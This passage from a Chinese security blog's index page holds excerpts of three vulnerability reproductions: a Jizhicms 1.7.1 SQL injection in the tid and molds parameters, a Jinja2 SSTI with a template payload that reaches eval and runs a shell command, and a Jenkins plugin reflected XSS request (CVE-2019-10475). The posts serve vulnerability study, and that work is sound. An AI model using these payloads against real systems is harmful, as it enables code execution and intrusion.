<p><img src="/resource/Jizhicms1.7.1._user_release.htmlsql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId24.png" alt="1.png"><img src="/resource/Jizhicms1.7.1._user_release.htmlsql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId25.png" alt="2.png">可以看到有明显的时间延迟，存在基于时间的延迟注入为了直观的展示是否进行了拼接sql语句的操作，监控下sql语句的执行，在mysql监控工具中可以看到没有任何过滤就进行了sql语句的拼接，触发了sql注入漏洞<img src="/resource/Jizhicms1.7.1._user_release.htmlsql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId26.png" alt="3.png">定位到漏洞函数release函数，重点关注下sql语句的拼接问题，一共有两处进行了sql的拼接，只要在进行拼接前没有进行过滤就会存在sql注入漏洞<img src="/resource/Jizhicms1.7.1._user_release.htmlsql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId27.png" alt="4.png">其中$this-&gt;classtypedata对应的是数据库中的classtype表中的数据<img src="/resource/Jizhicms1.7.1._user_release.htmlsql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId28.png" alt="5.png">然后跟进到get_fields_data函数，根据xdebug调试代码的运行情况，发现fields为空，所以会直接返回data,其中并没有进行任何过滤<img src="/resource/Jizhicms1.7.1._user_release.htmlsql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId29.png" alt="6.png">在release函数函数中只是要求$w[&#39;tid&#39;]!=0即可，所以我们可以在tid参数和molds参数处构造sql注入语句<img src="/resource/Jizhicms1.7.1._user_release.htmlsql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId30.png" alt="7.png">用slmap跑的结果<img src="/resource/Jizhicms1.7.1._user_release.htmlsql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId31.png" alt="8.png"></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7861/#toc-2">https://xz.aliyun.com/t/7861\#toc-2</a></p>
</blockquote>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Jizhicms/Jizhicms%201.7.1%20._user_release.html%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Jizhicms/Jizhicms%201.7.1%20._user_release.html%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qrk0009hy8v1bf1y1e1s" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Jinja2/Jinja2 SSTI 服务端模版注入攻击" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Jinja2/Jinja2%20SSTI%20%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/" class="article-date">
  <time datetime="2022-07-08T06:25:58.024Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Flask-jinja2-SSTI-服务端模版注入攻击"><a href="#Flask-jinja2-SSTI-服务端模版注入攻击" class="headerlink" title="Flask / jinja2 SSTI 服务端模版注入攻击"></a>Flask / jinja2 SSTI 服务端模版注入攻击</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p><code>SSTI</code>即服务端模版注入攻击。由于程序员代码编写不当，导致用户输入可以修改服务端模版的执行逻辑，从而造成<code>XSS</code>,任意文件读取，代码执行等一系列问题。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>编译及运行测试环境：</p>
<pre><code>docker-compose build
docker-compose up -d
</code></pre>
<p>访问<code>http://www.0-sec.org/?name=&#123;&#123;233*233&#125;&#125;</code>，得到54289，说明SSTI漏洞存在。</p>
<p>获取eval函数并执行任意python代码的POC：</p>
<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;
    &#123;% if c.__name__ == 'catch_warnings' %&#125;
      &#123;% for b in c.__init__.__globals__.values() %&#125;
      &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;
        &#123;% if 'eval' in b.keys() %&#125;
          &#123;&#123; b['eval']('__import__("os").popen("id").read()') &#125;&#125;
        &#123;% endif %&#125;
      &#123;% endif %&#125;
      &#123;% endfor %&#125;
&#123;% endif %&#125;
&#123;% endfor %&#125;
</code></pre>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Jinja2/Jinja2%20SSTI%20%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Jinja2/Jinja2%20SSTI%20%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/" data-id="cl5c2qrjz009fy8v1ex47fged" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Jenkins/（CVE-2019-10475）反射xss" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Jenkins/%EF%BC%88CVE-2019-10475%EF%BC%89%E5%8F%8D%E5%B0%84xss/" class="article-date">
  <time datetime="2022-07-08T06:25:57.951Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2019-10475）-插件反射型xss"><a href="#（CVE-2019-10475）-插件反射型xss" class="headerlink" title="（CVE-2019-10475） 插件反射型xss"></a>（CVE-2019-10475） 插件反射型xss</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>360 FireLine插件， 最高包括1.7.2 Bitbucket OAuth插件， 最高包括0.9<br>Build-metrics插件 1.3及以下 部署WebLogic Plugin 最高至4.1<br>Dynatrace应用程序监视插件， 最高包括2.1.3 Dynatrace应用程序监视插件，<br>最高包括2.1.4 ElasticBox Jenkins Kubernetes CI / CD插件， 最高至1.3<br>包含1.1.4及以下版本的 全局Post Script插件 Libvirt Slaves插件，<br>最高包括1.8.5 截至 2.7.0的 Mattermost Notification插件 Sonar<br>Gerrit插件， 最高包括2.3 Zulip插件 （包括1.1.0及以下）</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="1、手工复现"><a href="#1、手工复现" class="headerlink" title="1、手工复现"></a>1、手工复现</h3><p>该vulnearble插件位于<a target="_blank" rel="noopener" href="http://localhost:8080/plugin/build-metrics/%EF%BC%8C%E6%BC%8F%E6%B4%9E%E5%8F%82%E6%95%B0%E4%B8%BAlabel%E3%80%82">http://localhost:8080/plugin/build-metrics/，漏洞参数为label。</a></p>
<pre><code>http://192.168.1.75:8080/plugin/build-metrics/getBuildStats?label=&lt;script&gt;alert(&quot;CVE-2019-10475&quot;)&lt;/script&gt;&amp;range=2&amp;rangeUnits=Weeks&amp;jobFilteringType=ALL&amp;jobFilter=&amp;nodeFilteringType=ALL&amp;nodeFilter=&amp;launcherFilteringType=ALL&amp;launcherFilter=&amp;causeFilteringType=ALL&amp;causeFilter=&amp;Jenkins-Crumb=4412200a345e2a8cad31f07e8a09e18be6b7ee12b1b6b917bc01a334e0f20a96&amp;json=%7B%22label%22%3A+%22Search+Results%22%2C+%22range%22%3A+%222%22%2C+%22rangeUnits%22%3A+%22Weeks%22%2C+%22jobFilteringType%22%3A+%22ALL%22%2C+%22jobNameRegex%22%3A+%22%22%2C+%22jobFilter%22%3A+%22%22%2C+%22nodeFilteringType%22%3A+%22ALL%22%2C+%22nodeNameRegex%22%3A+%22%22%2C+%22nodeFilter%22%3A+%22%22%2C+%22launcherFilteringType%22%3A+%22ALL%22%2C+%22launcherNameRegex%22%3A+%22%22%2C+%22launcherFilter%22%3A+%22%22%2C+%22causeFilteringType%22%3A+%22ALL%22%2C+%22causeNameRegex%22%3A+%22%22%2C+%22causeFilter%22%3A+%22%22%2C+%22Jenkins-Crumb%22%3A+%224412200a345e2a8cad31f07e8a09e18be6b7ee12b1b6b917bc01a334e0f20a96%22%7D&amp;Submit=Search
</code></pre>
<p><img src="/resource/(CVE-2019-10475)%E5%8F%8D%E5%B0%84xss/media/rId26.png"></p>
<h3 id="2、利用脚本"><a href="#2、利用脚本" class="headerlink" title="2、利用脚本"></a>2、利用脚本</h3>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Jenkins/%EF%BC%88CVE-2019-10475%EF%BC%89%E5%8F%8D%E5%B0%84xss/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Jenkins/%EF%BC%88CVE-2019-10475%EF%BC%89%E5%8F%8D%E5%B0%84xss/" data-id="cl5c2qrjz009ey8v15gfd44ss" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  
  
    <nav id="page-nav">
      <a class="extend prev" rel="prev" href="/page/66/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/65/">65</a><a class="page-number" href="/page/66/">66</a><span class="page-number current">67</span><a class="page-number" href="/page/68/">68</a><a class="page-number" href="/page/69/">69</a><span class="space">&hellip;</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/68/">下一页</a>
    </nav>
  
</section>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 She11c0de<br>
      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <!--
      <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/categories/life" class="mobile-nav-link">生活</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
</nav>
    -->
    

<!-- 百度分享 start -->

<!-- 百度分享 end -->

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/jquery.scrollUp.min.js"></script>


<script src="/js/jquery.transform.js"></script>


<script src="/js/menu.js"></script>



<script src="/js/script.js"></script>


<script src="/js/scrollUp.js"></script>


  </div>
</body>
</html>